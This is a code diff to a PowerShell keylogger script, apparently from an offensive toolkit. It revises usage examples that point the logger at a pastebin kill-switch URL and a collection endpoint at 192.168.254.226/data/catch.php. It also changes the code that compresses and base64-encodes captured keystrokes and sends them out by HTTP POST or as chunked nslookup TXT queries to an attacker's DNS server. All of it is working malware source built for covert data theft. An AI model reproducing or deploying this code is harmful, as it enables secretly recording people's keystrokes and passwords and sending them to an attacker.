@@ -45,12 +45,12 @@ PS > .\Keylogger.ps1
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > .\Keylogger.ps1 http://example.com stopthis
+PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis
 Use above when using the payload from non-interactive shells and no exfiltration is required.
 
 .EXAMPLE
-PS > .\Keylogger.ps1 http://example.com stopthis -exfil <dev_key> <username> <pass> 3 
-Use above when using the payload from non-interactive shells or you don't want the payload to ask for any options.
+PS > .\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebServer -URL http://192.168.254.226/data/catch.php
+Use above for exfiltration to a webserver which logs POST requests
 
 
 .EXAMPLE
@@ -276,15 +276,16 @@ function script:Keylogger
 
             function Compress-Encode
             {
-                #Compression logic from http://blog.karstein-consulting.com/2010/10/19/how-to-embedd-compressed-scripts-in-other-powershell-scripts/
-                $encdata = [string]::Join("`n", $pastevalue)
-                $ms = New-Object System.IO.MemoryStream
-                $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
-                $sw = New-Object System.IO.StreamWriter($cs)
-                $sw.Write($encdata)
-                $sw.Close();
-                $Compressed = [Convert]::ToBase64String($ms.ToArray())
-                $Compressed
+                #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+                $ms = New-Object IO.MemoryStream
+                $action = [IO.Compression.CompressionMode]::Compress
+                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+                $pastevalue | ForEach-Object {$sw.WriteLine($_)}
+                $sw.Close()
+                # Base64 encode stream
+                $code = [Convert]::ToBase64String($ms.ToArray())
+                return $code
             }
 
             if ($exfiloption -eq "pastebin")
@@ -317,24 +318,24 @@ function script:Keylogger
 
             elseif ($exfiloption -eq "webserver")
             {
-                $Data = Compress-Encode
+                $Data = Compress-Encode    
                 post_http $URL $Data
             }
             elseif ($ExfilOption -eq "DNS")
             {
-                $code = Compress-Encode
                 $lengthofsubstr = 0
+                $code = Compress-Encode
                 $queries = [int]($code.Length/63)
                 while ($queries -ne 0)
                 {
                     $querystring = $code.Substring($lengthofsubstr,63)
-                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomaName $AuthNS"
+                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
                     $lengthofsubstr += 63
                     $queries -= 1
                 }
                 $mod = $code.Length%63
                 $query = $code.Substring($code.Length - $mod, $mod)
-                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $AuthNS"
+                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"
 
             }
 
